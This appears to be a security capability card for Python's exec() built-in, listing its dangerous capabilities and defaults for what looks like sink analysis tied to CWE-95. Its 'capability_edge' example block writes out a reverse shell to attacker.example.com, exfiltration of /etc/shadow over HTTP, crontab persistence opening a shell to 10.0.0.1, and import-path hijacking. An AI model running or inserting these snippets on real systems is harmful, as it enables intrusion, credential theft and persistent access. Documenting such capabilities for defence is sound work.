# builtins.exec

```yaml
schema_version: sink-capability-card/v2
card_id: SCC-004ab760d99ad15f
api: builtins.exec
api_family: builtins.exec
runtime:
  language: python
  ecosystem: python-runtime
  package: builtins
  version: legacy-source-bound
capability_class: code-eval
normative_authority: capability-facts-only
bound_sinks:
- exec()
- exec(code)
- exec(source)
roles:
- role_id: code
  description: Legacy controlled role code.
  bindings:
  - expression: code
    caller_bindable: true
facets:
- facet_id: legacy-facet-012f9153
  capability: Execute arbitrary Python source code in-process with the caller's full privilege level.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-b5a35d0a
  capability: Accept source as a string of one or more Python statements (unlike eval(), exec() is not limited to a single expression and can execute constructs like if/for/while/def/class/import).
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-78a86748
  capability: Accept source as a pre-compiled code object (output of compile()), allowing staged compilation then execution.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-60ba068b
  capability: Import any module reachable by the Python interpreter (os, subprocess, socket, http, ctypes, importlib, etc.).
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-f18eb6ec
  capability: Execute arbitrary operating-system commands via os.system(), os.popen(), subprocess.run(shell=True), subprocess.Popen(shell=True), os.exec*(), and similar.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-e2c37164
  capability: Spawn child processes and interact with their stdin/stdout/stderr via subprocess.Popen, os.popen, or pty.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-fc2bbb07
  capability: Read, write, create, delete, rename, and chmod any file the process can access, via open(), os, shutil, pathlib, and ctypes-based syscalls.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-1b1ac164
  capability: Access and mutate environment variables (os.environ); propagate environment changes to child processes.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-89c6dd06
  capability: Open arbitrary TCP/UDP sockets (socket, http.client, urllib, requests) — enables outbound data exfiltration, reverse shells, and SSRF.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-f0fe4e96
  capability: Bind and listen on local TCP/UDP ports (socket.bind/listen/accept) — enables backdoor listeners and C2 channels.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-ed24ebd9
  capability: Load and call arbitrary native shared libraries (.so/.dll/.dylib) via ctypes.CDLL, ctypes.WinDLL, cffi, or extension modules.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-69e07c1e
  capability: Invoke raw syscalls (if os or ctypes are available), bypassing Python-level abstractions.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-8e051319
  capability: Dynamically construct and execute further code strings (nested exec/eval/compile chains), enabling multi-stage payloads and self-modifying code.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-05233671
  capability: 'Modify the interpreter state: mutate builtins (e.g., replace __import__), reload modules (importlib.reload), alter sys.path to hijack imports, and patch running objects.'
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-76603ac8
  capability: Write to persistent startup files (~/.bashrc, ~/.profile, cron, systemd units, launchd plists, registry via ctypes/winreg) to survive process restarts.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-d6b4e179
  capability: Access and exfiltrate in-memory secrets already held by the process (API keys, tokens, passwords stored in variables or module globals).
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-5b935b28
  capability: Use the `globals` and `locals` parameters to control the namespace in which the code executes — including isolated dicts, restricted namespaces, or namespaces pre-seeded with attacker-chosen objects.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-aea74091
  capability: When `globals` is given without `locals`, `locals` defaults to that same dict (both scopes share the same namespace).
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-f5d62c3d
  capability: Use the `closure` parameter (code object mode only) to supply cellvars, enabling execution of closures that reference outer-scope variables.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-7577ab90
  capability: 'Perform reflection and introspection: inspect stack frames (inspect, sys._getframe), enumerate loaded modules (sys.modules), and discover the process''s full module/object graph.'
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-f3c04998
  capability: Override or monkey-patch functions and classes in any imported module, affecting all other code that imports the same module.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-47c04954
  capability: Call sys.exit() or os._exit() to terminate the process immediately.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-d3dc7716
  capability: Send signals (os.kill) to other processes owned by the same user.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-b6edd4cb
  capability: Access the file descriptor table (os.fdopen, os.listdir('/proc/self/fd') on Linux) and read/write inherited file descriptors.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-97b33b6e
  capability: Compile Python source to bytecode and execute it (compile() then exec()), or marshal/unmarshal code objects (marshal.loads() then exec()).
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-af8df314
  capability: Deserialize and execute pickled code objects (pickle with reduce/reduce_ex can execute arbitrary code on unpickle, and exec() can be embedded in the pickle payload or called from a deserialized object).
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-c5d677c8
  capability: When combined with __import__('code').interact(), spawn an interactive Python REPL inheriting the current namespace.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-a8d10f83
  capability: Bypass static analysis by executing dynamically-constructed strings, base64/hex-encoded payloads, or code assembled at runtime from data sources.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-80007b29
  capability: When the process runs with elevated privileges (root, sudo, setuid), all of the above escalate to those privilege levels.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
library_guarantees: []
defaults:
- default_id: legacy-default-839d3b65
  role_id: null
  value: By default, exec() inherits the caller's global and local namespace — executed code can read and mutate any variable visible at the call site, and side effects persist after exec() returns.
  security_effect: By default, exec() inherits the caller's global and local namespace — executed code can read and mutate any variable visible at the call site, and side effects persist after exec() returns.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-288d9466
  role_id: null
  value: When only `globals` is provided, `locals` defaults to the same dict, meaning local assignments inside the executed code also write to the globals dict (no separation of scopes).
  security_effect: When only `globals` is provided, `locals` defaults to the same dict, meaning local assignments inside the executed code also write to the globals dict (no separation of scopes).
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-1de761d8
  role_id: null
  value: There is no built-in sandbox, container, seccomp filter, chroot, or resource limit — exec() runs with the full capabilities of the host process.
  security_effect: There is no built-in sandbox, container, seccomp filter, chroot, or resource limit — exec() runs with the full capabilities of the host process.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-fd2ace7e
  role_id: null
  value: Redirect-following is not directly applicable, but exec'd code importing urllib/requests will follow HTTP redirects by default.
  security_effect: Redirect-following is not directly applicable, but exec'd code importing urllib/requests will follow HTTP redirects by default.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-c55368a1
  role_id: null
  value: The Python import system caches imports in sys.modules; once a module is imported inside exec'd code, it remains available to all subsequent exec() calls in the same process.
  security_effect: The Python import system caches imports in sys.modules; once a module is imported inside exec'd code, it remains available to all subsequent exec() calls in the same process.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-371c9cb3
  role_id: null
  value: stdout/stderr of exec'd code inherits the caller's file descriptors — output is not captured unless explicitly redirected (e.g., via contextlib.redirect_stdout).
  security_effect: stdout/stderr of exec'd code inherits the caller's file descriptors — output is not captured unless explicitly redirected (e.g., via contextlib.redirect_stdout).
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-9beafa0e
  role_id: null
  value: The __builtins__ reference inside the execution namespace is automatically populated by Python unless explicitly overridden or removed from the supplied globals dict.
  security_effect: The __builtins__ reference inside the execution namespace is automatically populated by Python unless explicitly overridden or removed from the supplied globals dict.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-63c1e1a5
  role_id: null
  value: On Windows, exec'd code inherits the process token and integrity level of the host process with no isolation boundary.
  security_effect: On Windows, exec'd code inherits the process token and integrity level of the host process with no isolation boundary.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
example_usage:
  benign: '# Standard usage: execute a dynamically-built string of Python code

    code = "x = [i**2 for i in range(5)]"

    namespace = {}

    exec(code, namespace)

    print(namespace[''x''])  # [0, 1, 4, 9, 16]


    # Execute a pre-compiled code object

    compiled = compile("result = sum(range(100))", "<string>", "exec")

    ns = {}

    exec(compiled, ns)

    print(ns[''result''])  # 4950

    '
  capability_edge: "# 1) Shell command execution via os.system — the classic entry point\nexec(\"import os; os.system('id; uname -a')\")\n\n# 2) Subprocess with piped I/O — arbitrary command execution with output capture\nexec(\"\"\"\nimport subprocess as sp\nout = sp.run(['cat', '/etc/passwd'], capture_output=True, text=True)\nprint(out.stdout[:200])\n\"\"\")\n\n# 3) Reverse shell via socket + subprocess — full interactive remote access\nexec(\"\"\"\nimport socket, subprocess as sp, os\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('attacker.example.com', 4444))\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nos.dup2(s.fileno(), 2)\nsp.call(['/bin/sh', '-i'])\n\"\"\")\n\n# 4) Native library loading — call arbitrary C functions\nexec(\"import ctypes; ctypes.CDLL('libc.so.6').system(b'id')\")\n\n# 5) File exfiltration over HTTP — read and send sensitive files\nexec(\"\"\"\nimport urllib.request, base64\ndata = open('/etc/shadow', 'rb').read()\nurllib.request.urlopen(\n\
    \    urllib.request.Request(\n        'https://attacker.example.com/exfil',\n        base64.b64encode(data),\n        {'Content-Type': 'application/octet-stream'}\n    )\n)\n\"\"\")\n\n# 6) Persistence via crontab — survive process restarts\nexec(\"\"\"\nimport os\npayload = '* * * * * python3 -c \"import socket,subprocess as sp,os;'\npayload += 's=socket.socket();s.connect((\\\\'10.0.0.1\\\\',9999));'\npayload += 'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'\npayload += 'sp.call([\\\\'/bin/sh\\\\',\\\\'-i\\\\'])\"'\nos.system(f'(crontab -l 2>/dev/null; echo \"{payload}\") | crontab -')\n\"\"\")\n\n# 7) Nested dynamic code generation — self-modifying/obfuscated payloads\nexec(\"exec('import os; os.system(\\\"whoami\\\")')\")\n\n# 8) REPL spawning — interactive namespace access\nexec(\"__import__('code').interact(local=dict(globals(), **locals()))\")\n\n# 9) Shutdown/halt — instant process termination\nexec(\"import os; os._exit(1)\")\n\n# 10) Bytecode execution\
    \ — compile at runtime then exec\nexec(\"exec(compile('import os; os.system(\\\"id\\\")', '<payload>', 'exec'))\")\n\n# 11) Module import hijacking — poison sys.path then import\nexec(\"\"\"\nimport sys\nsys.path.insert(0, '/tmp/evil')\n# next import of any module will check /tmp/evil first\n\"\"\")\n\n# 12) Global namespace injection with custom scope — pre-seed dangerous objects\nns = {'__builtins__': {'__import__': __import__, 'print': print}}\nexec(\"import os; os.system('id')\", ns)  # os is importable through __import__\n"
provenance:
- https://docs.python.org/3/library/functions.html#exec
- '{''CWE-95'': "Improper Neutralization of Directives in Dynamically Evaluated Code (''Eval Injection'')"}'
- https://cwe.mitre.org/data/definitions/95.html
- CDP Runtime.evaluate specification (analogous browser-side capability)
- '{''Python 3.12 source'': ''Python/bltinmodule.c builtin_exec_impl''}'
```
